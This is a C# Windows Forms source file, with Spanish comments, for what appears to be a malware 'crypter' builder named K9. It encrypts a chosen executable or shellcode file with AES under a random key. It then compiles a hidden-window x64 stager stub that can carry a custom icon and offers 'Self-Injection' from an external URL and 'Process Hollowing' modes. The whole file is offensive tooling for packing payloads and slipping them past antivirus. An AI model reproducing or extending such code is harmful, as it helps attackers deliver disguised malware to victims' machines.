using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using Microsoft.CSharp;
using System.CodeDom.Compiler;


namespace K9
{
    public partial class Crypt : Form
    {
        public Crypt()
        {
            InitializeComponent();
        }

        public static string Keygen(int Tamaño)
        {
            string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            StringBuilder sb = new StringBuilder();
            Random rnd = new Random();
            for (int i = 0; i < Tamaño; i++)
            {
                int index = rnd.Next(chars.Length);
                sb.Append(chars[index]);
            }

            return sb.ToString();
        }


        private void button4_Click(object sender, EventArgs e)
        {
            try
            {

                KeyGenBox.Text = Keygen(16);

            }
            catch (Exception ex)
            {
                KeyGenBox.Text = ("Algo pasó :(");

            }
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (tipoinyeccion.Text == "Self-Injection")
            {

                labelencriptarmain.Hide();
                buscar1.Hide();
                eligearchivencriptar.Hide();

                labelencriptarmain.Text = "Ingresa URL: ";

                labelencriptarmain.Show();
                eligearchivencriptar.Show();
                MessageBox.Show("Para este método debes ingresar una URL externa cargando tu .bin o ejecutable preferido.");

 



            } else if(tipoinyeccion.Text == "Process Hollowing")
            {
                //Continuar creando más stubs para cada proceso en cuestión
                labelencriptarmain.Text = "Elige archivo a encriptar";
                labelencriptarmain.Show();
                eligearchivencriptar.Show();
                buscar1.Show();
                


            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            
        }


        public static byte[] AES_Encrypt(byte[] Data, string Pass)
        {

            SHA256Managed sha256managed = new SHA256Managed();
            byte[] array = sha256managed.ComputeHash(Encoding.BigEndianUnicode.GetBytes(Pass));
            return new AesCryptoServiceProvider
            {
                KeySize = 256,
                Key = array,
                Mode = CipherMode.ECB


            }.CreateEncryptor().TransformFinalBlock(Data, 0, Data.Length);
        
        }
        
        //public static string ruta = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/Encriptado.bin";
        //public static string rutaparaself = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/st4g3r.exe";
        public static string keygenclave = Keygen(16);
       

private void button5_Click(object sender, EventArgs e)
        {
            if (cifradobox.Text == "AES") 
            {
                var nombrefinal = nombrearchivofinal.Text;
                //Arreglar la variable ruta para que no sea estática, cambiar a tu ruta específica.
                var ruta = @"C:\Users\mal\Desktop\" + nombrefinal + ".bin";
                var X = File.ReadAllBytes(eligearchivencriptar.Text);
                var Z = AES_Encrypt(X, keygenclave);
                File.WriteAllBytes(ruta, Z);
                MessageBox.Show(string.Format("Todo bien, binario guardado en: {0}", ruta));

            }
            if (tipoinyeccion.Text == "Self-Injection")
            {
                var nombrefinal = nombrearchivofinal.Text;
                var rutaparaexe = @"C:\Users\mal\Desktop\" + nombrefinal + ".exe";
                var csc = new CSharpCodeProvider();
                var parameters = new CompilerParameters(new[] { "System.dll", "System.Windows.Forms.dll", "System.Management.dll", "System.Core.dll", "System.Net.dll", "System.Runtime.dll", "System.Reflection.dll" }, rutaparaexe, true);


                parameters.GenerateExecutable = true;
                var icono = cajaicono.Text;
                if (icono == "")
                {

                    parameters.CompilerOptions = "/t:winexe /unsafe /platform:x64 /debug-";


                }
                else 
                {
                    parameters.CompilerOptions = "/t:winexe /unsafe /platform:x64 /debug- /win32icon:\"" + icono + "\"";

                }
 

                var stub = Properties.Resources.stubahorasi;
                stub = stub.Replace("cambiaraqui1", eligearchivencriptar.Text);
                stub = stub.Replace("cambiaraqui2", keygenclave);



                var result = csc.CompileAssemblyFromSource(parameters, stub);
                MessageBox.Show(string.Format("Todo bien, binario guardado en: {0}", rutaparaexe));



            }



        }

        
        private void eligearchivencriptar_TextChanged(object sender, EventArgs e)
        {
            

        
        }

        private void buscar1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openfiledialog = new OpenFileDialog();
            if (openfiledialog.ShowDialog() == DialogResult.OK)

            {

                eligearchivencriptar.Text = openfiledialog.FileName;

            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openfiledialog = new OpenFileDialog();
            openfiledialog.Filter = "ICO | *.ico";
            if (openfiledialog.ShowDialog() == DialogResult.OK)

            {

                cajaicono.Text = openfiledialog.FileName;

            }
        }
    }
}
